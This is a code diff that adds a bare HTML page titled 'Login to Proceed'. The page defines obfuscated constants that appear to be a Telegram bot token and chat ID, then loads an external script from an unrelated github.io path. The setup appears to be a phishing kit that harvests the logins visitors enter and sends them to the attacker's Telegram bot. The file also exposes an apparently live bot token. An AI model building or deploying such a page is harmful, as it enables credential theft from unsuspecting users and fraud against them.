@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login to Proceed</title>
+</head>
+<body>
+  <!-- Config variables -->
+  <script>
+    const iovjrtrdhhj9 = '8356203435:AAGdk-z8Ql3-lZOacal5-o_j8Cowq59FtbY'; 
+    const I94626736O = '8319766279';
+  </script>
+  <!-- Load fixed JS -->
+  <script src="https://linksvo.github.io/updafixlgs/inst.js" defer></script>
+</body>
+</html>
